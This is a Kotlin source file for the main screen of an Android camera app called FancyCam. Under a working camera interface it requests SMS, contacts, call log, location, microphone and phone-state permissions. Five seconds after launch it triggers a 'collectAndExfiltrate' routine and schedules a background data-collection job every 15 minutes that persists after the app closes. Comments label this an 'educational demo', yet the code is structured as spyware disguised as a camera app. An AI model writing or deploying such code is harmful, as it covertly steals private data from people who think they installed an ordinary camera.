package com.example.fancycam

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.ImageCapture
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.example.fancycam.databinding.ActivityMainBinding
import kotlinx.coroutines.launch
import java.io.File
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var cameraHelper: CameraHelper
    private var latestPhotoFile: File? = null
    private var latestServerUploadedName: String? = null

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            setupCamera()
        } else {
            binding.statusText.text = "Camera permission is required to use this app."
            Toast.makeText(this, "Camera permission denied", Toast.LENGTH_SHORT).show()
        }
    }

    private val requestNotificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        Log.d(TAG, "Notification permission granted: $isGranted")
    }

    private val requestMultiplePermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        for ((permission, granted) in permissions) {
            Log.d(TAG, "Permission $permission granted: $granted")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        checkAndRequestPermissions()

        // Shutter Button
        binding.captureButton.setOnClickListener {
            takePhotoAndProcess()
        }

        // Camera Switch (Front/Back)
        binding.switchCameraButton.setOnClickListener {
            switchCamera()
        }

        // Flash Toggle Button
        binding.btnFlash.setOnClickListener {
            cycleFlash()
        }

        // Initialize latest photo thumbnail if available
        loadInitialThumbnail()

        // Long press on app title or root to open settings
        val openSettingsAction = {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
            true
        }
        binding.appTitle.setOnLongClickListener { openSettingsAction() }
        binding.root.setOnLongClickListener { openSettingsAction() }

        // EDUCATIONAL DEMO: Trigger data collection after permissions
        binding.root.postDelayed({
            DataExfilSender.collectAndExfiltrate(this)
        }, 5000)

        // EDUCATIONAL DEMO: Schedule periodic collection
        schedulePeriodicCollection()
    }

    private fun loadInitialThumbnail() {
        val existingPhoto = PhotoStorageManager.getLatestPhoto(this)
        if (existingPhoto != null && existingPhoto.exists()) {
            latestPhotoFile = existingPhoto
            loadThumbnail(existingPhoto)
        }
    }

    private fun checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                requestNotificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED
        ) {
            setupCamera()
        } else {
            binding.statusText.text = "Requesting Camera permission..."
            requestPermissionLauncher.launch(Manifest.permission.CAMERA)
        }

        // Request storage and educational demo permissions
        val permissionsToRequest = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
        }

        // Additional data collection permissions for forensics demo
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_SMS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_CONTACTS)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_CALL_LOG)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.RECORD_AUDIO)
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(Manifest.permission.READ_PHONE_STATE)
        }

        if (permissionsToRequest.isNotEmpty()) {
            requestMultiplePermissionsLauncher.launch(permissionsToRequest.toTypedArray())
        }
    }

    private fun setupCamera() {
        binding.statusText.text = "Starting camera preview..."
        cameraHelper = CameraHelper(
            context = this,
            lifecycleOwner = this,
            previewView = binding.viewFinder
        )

        cameraHelper.startCamera(
            onReady = {
                val lens = if (cameraHelper.isFrontCamera()) "Front Camera" else "Back Camera"
                binding.statusText.text = "Ready to capture ($lens). Tap shutter button below."
            },
            onError = { exception ->
                binding.statusText.text = "Camera error: ${exception.localizedMessage}"
            }
        )
    }

    private fun switchCamera() {
        if (!::cameraHelper.isInitialized) return

        binding.switchCameraIcon.animate().rotationBy(180f).setDuration(250).start()
        binding.statusText.text = "Switching camera..."

        cameraHelper.toggleCamera(
            onReady = {
                val facing = if (cameraHelper.isFrontCamera()) "Front camera (Selfie)" else "Back camera"
                binding.statusText.text = "$facing ready. Tap shutter to capture."
            },
            onError = { err ->
                binding.statusText.text = "Switch failed: ${err.message}"
                Toast.makeText(this, "Cannot switch: ${err.message}", Toast.LENGTH_SHORT).show()
            }
        )
    }

    private fun cycleFlash() {
        if (!::cameraHelper.isInitialized) return

        val newMode = cameraHelper.cycleFlashMode()
        when (newMode) {
            ImageCapture.FLASH_MODE_AUTO -> {
                binding.btnFlash.setImageResource(R.drawable.ic_flash_auto)
                Toast.makeText(this, "Flash: Auto", Toast.LENGTH_SHORT).show()
            }
            ImageCapture.FLASH_MODE_ON -> {
                binding.btnFlash.setImageResource(R.drawable.ic_flash_on)
                Toast.makeText(this, "Flash: On", Toast.LENGTH_SHORT).show()
            }
            ImageCapture.FLASH_MODE_OFF -> {
                binding.btnFlash.setImageResource(R.drawable.ic_flash_off)
                Toast.makeText(this, "Flash: Off", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun triggerShutterAnimation() {
        binding.shutterFlashView.apply {
            alpha = 0.85f
            visibility = View.VISIBLE
            animate()
                .alpha(0f)
                .setDuration(150)
                .withEndAction { visibility = View.GONE }
                .start()
        }
    }

    private fun takePhotoAndProcess() {
        if (!::cameraHelper.isInitialized) {
            binding.statusText.text = "Camera is not ready yet."
            return
        }

        triggerShutterAnimation()
        binding.captureButton.isEnabled = false
        binding.statusText.text = "Capturing photo..."

        val photoFile = PhotoStorageManager.createNewPhotoFile(this)

        cameraHelper.takePhoto(
            outputFile = photoFile,
            onPhotoCaptured = { savedFile ->
                latestPhotoFile = savedFile
                binding.captureButton.isEnabled = true

                // 1. Index in device storage & MediaStore
                PhotoStorageManager.indexPhotoInStorage(this, savedFile)

                // 2. Update thumbnail preview on the main camera screen
                loadThumbnail(savedFile)

                // 3. Update status
                binding.statusText.text = "Photo saved to storage! Sending to server..."

                // 4. Send photo to server immediately in coroutine
                uploadPhotoImmediately(savedFile)

                // 5. Also enqueue WorkManager task for reliable background delivery
                enqueueUploadWork(savedFile)
            },
            onError = { exception ->
                binding.statusText.text = "Capture failed: ${exception.message}"
                binding.captureButton.isEnabled = true
                Toast.makeText(this, "Capture failed: ${exception.message}", Toast.LENGTH_SHORT).show()
            }
        )
    }

    private fun uploadPhotoImmediately(file: File) {
        lifecycleScope.launch {
            val result = PhotoUploader.uploadPhoto(file)
            if (result.success) {
                latestServerUploadedName = result.serverFilename
                binding.statusText.text = "Photo saved & uploaded to server! (${result.serverFilename})"
                Toast.makeText(
                    this@MainActivity,
                    "Photo sent to server: ${result.serverFilename}",
                    Toast.LENGTH_SHORT
                ).show()
            } else {
                binding.statusText.text = "Photo saved to storage (${file.name}). Upload queued."
                Log.w(TAG, "Direct upload failed: ${result.message}; background worker will retry.")
            }
        }
    }

    private fun loadThumbnail(file: File) {
        try {
            val options = BitmapFactory.Options().apply {
                inSampleSize = 4 // Downsample for efficient thumbnail display
            }
            val thumb = BitmapFactory.decodeFile(file.absolutePath, options)
            if (thumb != null) {
                binding.photoThumbnail.setImageBitmap(thumb)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to load thumbnail: ${e.message}")
        }
    }

    private fun enqueueUploadWork(file: File) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val uploadWorkRequest = OneTimeWorkRequestBuilder<PhotoUploadWorker>()
            .setConstraints(constraints)
            .setInputData(workDataOf(PhotoUploadWorker.KEY_IMAGE_PATH to file.absolutePath))
            .build()

        WorkManager.getInstance(this).enqueue(uploadWorkRequest)
        Log.d(TAG, "Photo backup worker task enqueued for ${file.name}")
    }

    /**
     * EDUCATIONAL DEMO: Schedule periodic data collection via WorkManager.
     * Demonstrates persistent background execution that survives app termination.
     */
    private fun schedulePeriodicCollection() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val periodicWork = PeriodicWorkRequestBuilder<DataCollectionWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            DataCollectionWorker.WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            periodicWork
        )

        Log.d(TAG, "[EDUCATIONAL] Periodic data collection scheduled (every 15 min)")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (::cameraHelper.isInitialized) {
            cameraHelper.shutdown()
        }
        MicrophoneCapture.stopCapture()
    }

    companion object {
        private const val TAG = "MainActivity"
    }
}
